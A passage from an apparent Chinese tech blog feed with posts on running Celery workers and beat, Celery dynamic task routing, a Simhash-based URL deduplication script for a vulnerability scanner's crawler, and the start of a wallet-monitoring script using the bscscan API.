</li>
</ol>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery-任务调度框架实践</title>
    <url>/2018/40513.html</url>
    <content><![CDATA[<h1>celery架构图：</h1>
<ol>
<li class="lvl-3">
<p>Celery Beat：任务调度器，Beat进程会读取配置文件的内容，周期性地将配置中到期需要执行的任务发送给任务队列。</p>
</li>
<li class="lvl-3">
<p>Celery Worker：执行任务的消费者，通常会在多台服务器运行多个消费者来提高执行效率。</p>
</li>
<li class="lvl-3">
<p>Broker：消息代理，或者叫作消息中间件，接受任务生产者发送过来的任务消息，存进队列再按序分发给任务消费方（通常是消息队列或者数据库）。</p>
</li>
<li class="lvl-3">
<p>Producer：调用了Celery提供的API、函数或者装饰器而产生任务并交给任务队列处理的都是任务生产者。</p>
</li>
<li class="lvl-3">
<p>Result Backend：任务处理完后保存状态信息和结果，以供查询。Celery默认已支持Redis、RabbitMQ、MongoDB、Django ORM、SQLAlchemy等方式。</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35803f2f.jpg" alt="" /></p>
<hr />
<h1>初始化:</h1>
<h2 id="1-运行celery">1.运行celery</h2>
<p>mac环境下的celery一下载就能直接运行。但是centos6.9 环境下好像下载之后并不能直接运行，估计是环境变量没有配好。需要加上celery的安装路径。使用<code>/usr/local/bin/celery -A your_app worker --loglevel=info</code></p>
<hr />
<h2 id="2-以守护进程运行celery">2.以守护进程运行celery:</h2>
<p>需要一个初始化脚本：celeryd</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用方法：/etc/init.d/celeryd {start|stop|restart|status}</p>
</li>
<li class="lvl-2">
<p>配置文件:/etc/default/celeryd</p>
</li>
</ul>
<p>参考：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/14275821/how-to-run-celery-as-a-daemon-in-production">How to run celery as a daemon in production?</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.csdn.net/happyAnger6/article/details/51626516">Celery教程-------------以守护进程方式运行worker</a></p>
</li>
</ul>
<hr />
<h2 id="3-使用redis">3.使用redis:</h2>
<p>mac下安装redis</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>brew install redis</p>
</li>
<li class="lvl-2">
<p>如果需要后台运行 redis 服务，使用命令 brew services start redis</p>
</li>
<li class="lvl-2">
<p>如果不需要后台服务，则使用命令 redis-server /usr/local/etc/redis.conf。</p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/3bdfda703552">mac os 安装 redis</a></p>
</li>
</ul>
<p>安装redis后，启动时指定配置文件</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>redis-server ./redis.conf</code></p>
</li>
</ul>
<p>检测后台进程是否存在</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ps -ef |grep redis </code></p>
</li>
</ul>
<p>使用分布式时，其他worker机子无法访问redis去取任务：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>redis默认的安全策略，只准许本地访问。</p>
</li>
<li class="lvl-2">
<p>需要通过简单配置，完成允许外网访问。</p>
</li>
<li class="lvl-2">
<p>参考：<a href="http://www.cnblogs.com/likwo/p/5903377.html">开启redis 允许外网IP 访问</a></p>
</li>
</ul>
<hr />
<h1>celery基本操作命令：</h1>
<p>参考：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://funhacks.net/explore-python/Third-Party-Modules/celery.html">Celery基础操作</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.csdn.net/libing_thinking/article/category/7287529">Celery-4.1 用户指南</a></p>
</li>
</ul>
<hr />
<h1>celery worker:</h1>
<h2 id="1-启动worker">1.启动worker:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>export PYTHONOPTIMIZE=1 &amp;&amp; /usr/local/bin/celery -A your_app worker --loglevel=debug --workdir=/your_dir/your_dir/your_dir/ </code></p>
</li>
</ul>
<hr />
<h2 id="2-停止worker">2.停止worker:</h2>
<p><code>ps auxww | grep 'celery worker' | awk '&#123;print $2&#125;' | xargs kill -9</code></p>
<hr />
<h2 id="3-在celery中使用多进程：">3.在celery中使用多进程：</h2>
<p>我用的是<code>from multiprocessing import Pool</code>来实现多进程。但是在运行过程中会直接报出这个错误<br />
<code>AssertionError: daemonic processes are not allowed to have children</code></p>
<p>解决方法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>重写一个Mypool<code>https://stackoverflow.com/questions/6974695/python-process-pool-non-daemonic</code></p>
</li>
<li class="lvl-2">
<p>设置环境变量<br />
<code>export PYTHONOPTIMIZE=1</code></p>
</li>
</ul>
<p>由于过段时间就会失效。。所以每次启动worker的时候的时候：<br />
<code>export PYTHONOPTIMIZE=1 &amp;&amp; /usr/local/bin/celery -A your_app worker --loglevel=debug --workdir=/your_dir/your_dir/your_dir/</code></p>
<p>以下 的方法没试过：</p>
<blockquote>
<p>there are two method to solve this problem ,disable assert：<br />
1.where celery starts set export PYTHONOPTIMIZE=1 OR start celery with this parameter -O OPTIMIZATION<br />
2.disable python packet multiprocessing <a href="http://process.py">process.py</a> line 102:<br />
assert not _current_process._config.get(‘daemon’), \ ‘daemonic processes are not allowed to have children’</p>
</blockquote>
<hr />
<h2 id="4-调用worker、添加任务：">4.调用worker、添加任务：</h2>
<p>delay()和apply_async()</p>
<p>我们之前调用任务使用了”delay()”方法，它其实是对”apply_async()”方法的封装，使得你只要传入任务所需的参数即可。对于特殊的任务调度需求，你需要使用”apply_async()”，其常用的参数有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>countdown: 指定多少秒后任务才被执行</p>
</li>
<li class="lvl-2">
<p>eta: 指定任务被调度的时间，参数类型是datetime</p>
</li>
<li class="lvl-2">
<p>expires: 任务过期时间，参数类型可以是int（秒），也可以是datetime</p>
</li>
<li class="lvl-2">
<p>retry: 任务发送失败的重试次数</p>
</li>
<li class="lvl-2">
<p>priority: 任务优先级，范围是0-9</p>
</li>
<li class="lvl-2">
<p>serializer: 参数和返回值的序列化方式</p>
</li>
</ul>
<hr />
<h1>celery beat 定时任务</h1>
<h2 id="一个时间的Bug：">一个时间的Bug：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>当前使用pip安装的celery，默认是安装的最新版本4.1.0，但是在这个版本中在获取当前时间的逻辑中存在bug，会导致定时任务配置后并不能在指定的时间被执行</p>
</li>
<li class="lvl-2">
<p>回退版本 到4.0.2才行</p>
</li>
<li class="lvl-2">
<p><a href="http://axiaoxin.com/article/228/">celery 4.1.0 版本定时任务执行时间 bug</a></p>
</li>
</ul>
<p>另一种可行但麻烦的思路：</p>
<p>celery的定时任务会有一定时间的延迟。比如，我规定模拟登陆新浪微博任务每隔10个小时执行一次，那么定时任务第一次执行就会在开启定时任务之后的10个小时后才会执行。而我抓取微博需要马上执行，需要带上cookie，所以不能等那1个小时。这个没有一个比较好的解决方法，可以使用celery的crontab()来代替schdule做定时，它会在启动的时候就执行。我采用的方法是第一次手动执行该任务，然后再通过schedule执行。</p>
<hr />
<h2 id="使用命令：">使用命令：</h2>
<p>进入到对应your_app对应的目录下：<code>cd /your_dir/your_dir/your_dir</code>再执行：<code>/usr/local/bin/celery -A your_app beat -l info </code></p>
<p>最方便的是，在命令中指定工作目录，一条命令即可：</p>
<p><code>/usr/local/bin/celery -A your_dir beat -l info --workdir=/your_dir/your_dir/your_dir/</code></p>
<hr />
<h2 id="定时任务参数参考表：">定时任务参数参考表：</h2>
<p><img src="https://i.loli.net/2019/04/26/5cc2e358c3d84.jpg" alt="" /></p>
<hr />
<h2 id="动态管理定时任务：">动态管理定时任务：</h2>
<p>查过挺多资料，有两种解决方法。跟celery运行的调度器(schedule)息息相关的。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用第三方schedule：如django-celery-beat库会将定时任务的规则存入到数据库中，而不用通过配置文件来定义。</p>
</li>
</ul>
<p>try to install django-celery instead of django-celery-beat. django-celery works with Celery 3 (unlike django-celery-beat). You can then, for example import PeriodicTask from djcelery.models instead of from django_celery_beat.models . This allows you to add/delete/manipulate tasks both dynamically AND PROGRAMMATICALLY (not only from the Django admin site). The drawback to this workaround is that if one doesn’t need django-celery for anything other than this, then it bloats one’s app. Thus, It would be better to have Celery 4.0 included in cookiecutter-django so that django-celery-beat models can be used</p>
<p><a href="http://www.liuliqiang.info/post/celery-advanced-topic-scheduler-and-priority/">【celery进阶】定时任务和优先级</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用框架默认schedule</p>
</li>
</ul>
<p>我使用的是这一种方法。只能管理celery的配置文件了，每次增加或减少定时任务的时候，都要对配置文件进行相应的修改。每次修改完都要重启celerybeat，试过多种方法，发现用supervisor来管理celery beat的进程是比较好的。</p>
<hr />
<h2 id="管理celery-beat进程">管理celery beat进程</h2>
<p>用supervisor来管理celery beat进程。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>安装：<code>pip install supervisor</code></p>
</li>
<li class="lvl-2">
<p>Supervisor配置</p>
</li>
<li class="lvl-3">
<p><code>/usr/local/bin/echo_supervisord_conf  &gt; /etc/supervisord.conf</code></p>
</li>
<li class="lvl-3">
<p><img src="https://i.loli.net/2019/04/26/5cc2e359693ae.jpg" alt="" /></p>
</li>
<li class="lvl-2">
<p>操作：</p>
</li>
<li class="lvl-3">
<p>开启:<code>supervisord -c /etc/supervisord.conf</code></p>
</li>
<li class="lvl-3">
<p>重启：<code>supervisorctl -c /etc/supervisord.conf reload</code></p>
</li>
<li class="lvl-3">
<p>关闭:<code>supervisorctl -c /etc/supervisord.conf shutdown</code></p>
</li>
</ul>
<hr />
<h1>other:</h1>
<h2 id="分布式：">分布式：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.213.name/archives/1105">笔记：集群部署celery分布式任务队列</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/ee14ed9e4989">《Python分布式计算》 第4章 Celery分布式应用 （Distributed Computing with Python）</a></p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35a0c484.jpg" alt="" /></p>
<hr />
<h2 id="队列：">队列：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/1f528c518ab5">Celery从入门到放弃</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.csdn.net/vintage_1/article/details/47664139">celery beat实战</a></p>
</li>
</ul>
<hr />
<h2 id="flower">flower:</h2>
<p>图形化管理celery界面：</p>
<p><code>/usr/local/bin/celery -A celery_app flower --port=5555</code></p>
<hr />
<h2 id="参考：">参考：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.mkernel.com/?p=117">Python异步神器-Celery实战之Nmap扫描</a></p>
</li>
<li class="lvl-2">
<p><a href="https://hk.saowen.com/a/76cb411ce1023c1ee172406691abe47d7939a4b2d8c56a8439aab39f4486df30">企業安全實踐(基礎建設)之主動分佈式WEB資產掃描</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.csdn.net/junli_chen/article/details/73504343">Celery 框架学习笔记</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.csdn.net/kk123a/article/details/74549117">celery配置使用</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery-动态路由</title>
    <url>/2019/42649.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在使用celery的时候,可以根据任务情况(任务类型,任务参数),更灵活的把任务分发到不同的队列里.</p>
<hr />
<h1>任务的去向</h1>
<p>在Celery中, 任务的目的是由下列因素决定（按顺序）:</p>
<ol>
<li class="lvl-3">
<p>task_routes 中定义的路由</p>
</li>
<li class="lvl-3">
<p>Task.apply_async() 方法的路由参数</p>
</li>
<li class="lvl-3">
<p>Task 本身定义的路由相关属性</p>
</li>
</ol>
<p>最佳实践是<strong>不写死这些设置，而是通过 Routers 将它作为配置选项；这是最灵活的方式</strong>，但是合理的默认值仍然可以设置称任务属性。</p>
<hr />
<h1>手动路由做法:</h1>
<p>一般都会在celery的配置文件里静态写死队列和路由即默认值.如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_QUEUES=(Queue(<span class="string">&quot;fingerprint&quot;</span>, Exchange(<span class="string">&quot;fingerprint&quot;</span>),routing_key=<span class="string">&quot;fingerprint&quot;</span>),  <span class="comment"># 指纹识别)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_ROUTES=&#123; <span class="string">&#x27;fingerprint_all_scanner.tasks.startDetectUrl&#x27;</span>: &#123;<span class="string">&quot;queue&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>, <span class="string">&quot;routing_key&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>&#125;,&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h1>动态路由做法:</h1>
<p>自定义一个Router类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyRouter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">route_for_task</span>(<span class="params">self, task, args=<span class="literal">None</span>, kwargs=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">print</span> task  <span class="comment"># 任务类型</span></span><br><span class="line">        <span class="built_in">print</span> args  <span class="comment"># 列表任务参数</span></span><br><span class="line">        <span class="built_in">print</span> kwargs <span class="comment"># 键值对任务参数</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 在此处可以自定义代码,可以根据任务参数或者任务类型更灵活的将任务发到不同的队列里</span></span><br><span class="line">        <span class="keyword">if</span> task.startswith(<span class="string">&#x27;fingerprint_all_scanner&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;queue&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>, <span class="string">&quot;routing_key&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后把配置替换为如下即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_ROUTES=(MyRouter(),)</span><br></pre></td></tr></table></figure>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/zhangfh1990/article/details/77043562">Celery消息队列----路由任务</a></p>
</li>
<li class="lvl-2">
<p><a href="http://docs.jinkan.org/docs/celery/userguide/routing.html#routers">Routing Tasks</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/b3d2c5871bec">celery路由和交换的相关知识</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Crawler-利用Simhash做URL去重</title>
    <url>/2019/40924.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>为了防止扫重复的url以及提高扫描效率,url去重扫描器的爬虫中必不可少的一部分.</p>
<hr />
<h1>实现思路:</h1>
<h2 id="第一步：泛化">第一步：泛化</h2>
<p>解析URL的每个参数，把每个参数的值做泛化.</p>
<p>例如将参数值里面的字母转化为A，数字转化为N，特殊符号转换为T，其他符号或者字符转化成C</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;list=gengduo</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_xiaoyu50</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_50dao100</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_100dao150</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_150dao200</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_200dao500</span><br></pre></td></tr></table></figure>
<p>经过泛化后则为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;list=gengduo</span><br><span class="line">http://tuan.qunar.com/?list=AAAAAAA&amp;in_track=AAAATAAAATAAAAAAA</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_xiaoyu50</span><br><span class="line">http://tuan.qunar.com/?tag=AAAAATAAAAAANN&amp;in_track=AAAATAAAATAAAAAAA</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_50dao100</span><br><span class="line">http://tuan.qunar.com/?tag=AAAAATNNAAANNN&amp;in_track=AAAATAAAATAAAAAAA</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="第二步-Simhash">第二步: Simhash</h2>
<p>Simhash是Google处理网页去重的算法.</p>
<p>Simhash的作用简单来说就是判断两个URL是否相似，如果汉明距离在一定范围内，就可判断两个URL相似。</p>
<hr />
<h2 id="完整代码">完整代码:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/8/5 8:41 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : refs: https://docs.ioin.in/writeup/www.noblexu.com/_%E5%88%A9%E7%94%A8Simhash%E5%81%9AURL%E5%8E%BB%E9%87%8D%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F_/index.html</span></span><br><span class="line"><span class="comment"># @File    : filter.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> simhash <span class="keyword">import</span> Simhash</span><br><span class="line"></span><br><span class="line">Chars = [<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_etl</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    url泛化处理</span></span><br><span class="line"><span class="string">    :param url: 原始url</span></span><br><span class="line"><span class="string">    :return: 处理过后的url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    params_new = &#123;&#125;</span><br><span class="line">    u = urlparse.urlparse(url)</span><br><span class="line">    query = unquote(u.query)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> query:</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    path = unquote(u.path)</span><br><span class="line">    params = urlparse.parse_qsl(query, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> params:</span><br><span class="line">        <span class="keyword">if</span> v:</span><br><span class="line">            params_new[k] = etl(v)</span><br><span class="line">    query_new = urllib.parse.urlencode(params_new)</span><br><span class="line">    url_new = urlparse.urlunparse(</span><br><span class="line">        (u.scheme, u.netloc, u.path, u.params, query_new, u.fragment))</span><br><span class="line">    <span class="comment"># print url_new</span></span><br><span class="line">    <span class="keyword">return</span> url_new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">etl</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    传入一个字符串，将里面的字母转化为A，数字转化为N，特殊符号转换为T，其他符号或者字符转化成C</span></span><br><span class="line"><span class="string">    :param str: </span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        c = c.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            chars += <span class="string">&#x27;A&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>):</span><br><span class="line">            chars += <span class="string">&#x27;N&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> c <span class="keyword">in</span> Chars:</span><br><span class="line">            chars += <span class="string">&#x27;T&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars += <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> chars</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_compare</span>(<span class="params">url, link</span>):</span><br><span class="line">    dis = Simhash(url).distance(Simhash(link))</span><br><span class="line">    <span class="keyword">if</span> -<span class="number">2</span> &lt; dis &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reduce_urls</span>(<span class="params">ori_urls</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    对url列表去重</span></span><br><span class="line"><span class="string">    :param ori_urls: 原始url列表</span></span><br><span class="line"><span class="string">    :return: 去重后的url列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    etl_urls = []</span><br><span class="line">    result_urls = []</span><br><span class="line">    <span class="keyword">for</span> ori_url <span class="keyword">in</span> ori_urls:</span><br><span class="line">        etl = url_etl(ori_url)</span><br><span class="line">        <span class="built_in">print</span>(etl)</span><br><span class="line">        score = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> etl_urls:</span><br><span class="line">            <span class="keyword">for</span> etl_url <span class="keyword">in</span> etl_urls:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> url_compare(etl, etl_url):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> score == <span class="built_in">len</span>(etl_urls):</span><br><span class="line">                result_urls.append(ori_url)</span><br><span class="line">                etl_urls.append(etl)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            etl_urls.append(etl)</span><br><span class="line">            result_urls.append(ori_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_list = [</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58963&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58964&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58965&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58966&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58967&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58968&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58969&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58970&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58971&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58972&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58973&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58974&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58975&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58976&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58977&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58978&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(len(test_list))</span></span><br><span class="line">    <span class="built_in">print</span>(reduce_urls(test_list))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># url = &#x27;http://tuan.qunar.com/ext/sact/RjABVv?in_track=home_tuan_content_lunbo&#x27;</span></span><br><span class="line">    <span class="comment"># print(url_etl(url))</span></span><br><span class="line">    <span class="comment"># print(etl(url))</span></span><br></pre></td></tr></table></figure>
<hr />
<h1>总结:</h1>
<p>基于布尔的sql注入扫描起来需要发比较多的测试payload</p>
<p>一开始爬虫没对url进行去重,然后遇到咨询类网站的时候.</p>
<p>就发现前面爬的几十条链接都是几乎一样的,参数也是一样</p>
<p>但是因为没有去重导致一直重复在扫这个页面的这几个参数.</p>
<p>效率和效果都非常差,加了过滤之后,需要扫描的url少了很多.效率提高了不少.</p>
<p>但是这个时候也要注意,要看看有没因过滤而漏掉的url,宁愿重复扫也不要漏扫太多…</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.ioin.in/writeup/www.noblexu.com/_%E5%88%A9%E7%94%A8Simhash%E5%81%9AURL%E5%8E%BB%E9%87%8D%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F_/index.html">利用Simhash做URL去重的实现方式</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Bp宝石回购监控脚本</title>
    <url>/2021/32598.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>来自朋友的需求,bp项目方某个钱包地址每隔一段时间就会回购宝石代币要监控该钱包回购的动作</p>
<hr />
<h1>脚本:</h1>
<h2 id="思路">思路:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008145806.png" alt="20211008145806" /></p>
<p>一开始打算用爬虫,不过想起之前写<code>rarity</code>的升级脚本调用过<code>ftmscan</code>的api</p>
<p>所以看了一下<code>bscscan</code>的api文档，找到个方法能满足需求</p>
<p><code>Get a list of 'Normal' Transactions By Address</code>获取地址的交易记录</p>
<hr />
<h2 id="解析input-data">解析input data:</h2>
<p><code>https://api.bscscan.com/api?module=account&amp;action=txlist&amp;address=0xF426a8d0A94bf039A35CEE66dBf0227A7a12D11e&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=YourApiKeyToken</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008151300.png" alt="20211008151300" /></p>
<p>api获取到json结果，本来想拿到它的hash再去进一步查询，但是看到<code>input</code>的数据，这里面其实也是包含了交易的内容，可以尝试去decode这些数据。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008153504.png" alt="20211008153504" /></p>
<p><a href="https://ethereum.stackexchange.com/questions/11144/how-to-decode-input-data-from-a-transaction">How to decode input data from a transaction?</a></p>
<p>搜索了一下，似乎是可以定义<code>contract</code>对象，调用函数直接decode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.decode_function_input(transaction.input)</span><br></pre></td></tr></table></figure>
<p>每次回购动作，都是去跟合约交互<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008151537.png" alt="20211008151537" /></p>
<p>但是这个合约没有开源，没法拿到abi,没法获得<code>contract</code>对象，似乎就没法直接去decode。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/7A702759-9A99-4885-8FE9-26DFBE6BC98F.png" alt="7A702759-9A99-4885-8FE9-26DFBE6BC98F" /></p>
<p>再观察一下其中一个input数据:</p>
